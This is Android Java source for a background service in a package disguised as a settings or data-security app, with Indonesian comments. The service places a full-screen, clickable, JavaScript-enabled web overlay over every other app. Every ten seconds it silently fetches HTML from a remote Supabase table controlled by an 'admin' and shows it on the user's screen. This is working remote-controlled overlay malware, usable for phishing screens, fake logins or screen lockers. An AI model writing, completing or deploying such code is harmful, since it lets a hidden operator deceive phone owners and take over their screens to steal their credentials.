package com.settings.datasecure;

import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.view.Gravity;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class LayananBackground extends Service {

    private WindowManager windowManager;
    private WebView webViewOverlay;
    private Handler handler = new Handler(Looper.getMainLooper());
    private String htmlTerakhir = "";
    
    // --- PENGATURAN SUPABASE ---
    // URL ini langsung menembak ke tabel app_settings baris id 1
    private final String URL_SUPABASE = "https://heaedfjyjpfvpddtgjhk.supabase.co/rest/v1/app_settings?id=eq.1&select=html_content";
    
    // PERHATIAN: Masukkan Kunci API Supabase Anda yang berawalan 'eyJ...' di bawah ini
    private final String KUNCI_SUPABASE = "MASUKKAN_KUNCI_API_EYJ_ANDA_DI_SINI"; 

    @Override
    public void onCreate() {
        super.onCreate();
        siapkanOverlayWeb();
        mulaiPengecekanOtomatis();
    }

    private void siapkanOverlayWeb() {
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        
        // Membuat Browser/Web (WebView) sebagai pengganti layar hitam
        webViewOverlay = new WebView(this);
        WebSettings webSettings = webViewOverlay.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webViewOverlay.setWebViewClient(new WebViewClient());
        
        // Set latar belakang transparan saat menunggu loading
        webViewOverlay.setBackgroundColor(0x00000000); 

        int jenisOverlay;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            jenisOverlay = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            jenisOverlay = WindowManager.LayoutParams.TYPE_PHONE;
        }

        // Pengaturan agar web menutupi seluruh layar dan bisa diklik (interaktif)
        WindowManager.LayoutParams parameter = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                jenisOverlay,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
        );
        parameter.gravity = Gravity.CENTER;

        windowManager.addView(webViewOverlay, parameter);
    }

    // Fungsi Timer: Berjalan berulang kali tanpa mematikan HP
    private void mulaiPengecekanOtomatis() {
        Runnable sistemPemantau = new Runnable() {
            @Override
            public void run() {
                tarikDataDariAdmin();
                // Mengulang perintah ini setiap 10.000 milidetik (10 detik)
                handler.postDelayed(this, 10000); 
            }
        };
        handler.post(sistemPemantau);
    }

    // Fungsi untuk menyedot file HTML dari Supabase secara diam-diam
    private void tarikDataDariAdmin() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(URL_SUPABASE);
                    HttpURLConnection koneksi = (HttpURLConnection) url.openConnection();
                    koneksi.setRequestMethod("GET");
                    koneksi.setRequestProperty("apikey", KUNCI_SUPABASE);
                    koneksi.setRequestProperty("Authorization", "Bearer " + KUNCI_SUPABASE);
                    koneksi.setRequestProperty("Accept", "application/json");

                    if (koneksi.getResponseCode() == 200) {
                        BufferedReader in = new BufferedReader(new InputStreamReader(koneksi.getInputStream()));
                        StringBuilder response = new StringBuilder();
                        String baris;
                        while ((baris = in.readLine()) != null) {
                            response.append(baris);
                        }
                        in.close();

                        // Membaca data JSON dari Supabase
                        JSONArray dataJson = new JSONArray(response.toString());
                        if (dataJson.length() > 0) {
                            JSONObject barisData = dataJson.getJSONObject(0);
                            final String htmlBaru = barisData.getString("html_content");

                            // Jika HTML yang didapat berbeda dari yang sedang tampil, otomatis perbarui layar!
                            if (!htmlBaru.equals(htmlTerakhir)) {
                                htmlTerakhir = htmlBaru;
                                handler.post(new Runnable() {
                                    @Override
                                    public void run() {
                                        // Merender HTML ke layar
                                        webViewOverlay.loadDataWithBaseURL(null, htmlBaru, "text/html", "UTF-8", null);
                                    }
                                });
                            }
                        }
                    }
                    koneksi.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; 
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (webViewOverlay != null && windowManager != null) {
            windowManager.removeView(webViewOverlay);
        }
        handler.removeCallbacksAndMessages(null);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
